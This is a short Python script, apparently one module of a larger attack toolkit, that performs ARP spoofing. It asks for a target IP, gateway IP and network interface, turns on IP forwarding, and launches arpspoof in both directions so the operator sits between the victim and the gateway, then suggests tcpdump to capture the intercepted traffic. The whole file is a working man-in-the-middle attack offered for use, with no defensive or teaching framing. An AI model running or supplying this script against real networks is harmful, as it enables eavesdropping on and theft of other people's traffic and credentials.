#!/usr/bin/env python3
# ARP Spoofing Module

import os, sys, time, subprocess

def run():
    print("\n" + "="*60)
    print("ARP SPOOFING")
    print("="*60)
    
    target_ip = input("Target IP: ").strip()
    gateway_ip = input("Gateway IP: ").strip()
    interface = input("Network interface [eth0]: ").strip() or "eth0"
    
    print(f"\nStarting ARP spoofing on {interface}")
    print(f"Target: {target_ip} | Gateway: {gateway_ip}")
    print("Press Ctrl+C to stop")
    
    try:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        cmd1 = f"arpspoof -i {interface} -t {target_ip} {gateway_ip}"
        cmd2 = f"arpspoof -i {interface} -t {gateway_ip} {target_ip}"
        
        print(f"Running: {cmd1}")
        print(f"Running: {cmd2}")
        print("\nUse 'tcpdump' to capture traffic")
        
        subprocess.Popen(cmd1.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.Popen(cmd2.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nStopping ARP spoofing...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("Done")

if __name__ == "__main__":
    run()